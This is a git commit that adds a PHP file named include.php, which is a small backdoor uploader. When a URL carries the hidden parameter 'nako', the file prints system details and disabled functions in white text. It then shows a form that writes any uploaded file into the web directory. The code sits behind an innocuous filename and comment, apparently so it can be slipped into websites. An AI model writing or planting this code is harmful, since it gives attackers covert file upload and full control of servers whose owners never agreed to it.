3700eb581fddff20818a252e5c1be97ea5668598
Tatsumi-Crew Official <71838907+TatsumiOfficial@users.noreply.github.com>
2025-07-12 13:54:58 +0700

    Add files via upload

---
+++ include.php
@@ -0,0 +1,18 @@
+<?php
+//* patch file.php?nako
+ if(isset($_GET["nako"]))
+ {
+  echo"<font color=#ffffff>".php_uname()."";
+  print "\n";$disable_functions = @ini_get("disable_functions"); 
+  echo "<br>DisablePHP=".$disable_functions; print "\n"; 
+  echo"<br><form method=post enctype=multipart/form-data>"; 
+  echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; 
+    if($_POST["k"]==upload)
+{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
+echo"<b>".$_FILES["f"]["name"];
+}else{
+echo"<b>Gagal upload cok";
+}
+} 
+}
+?>
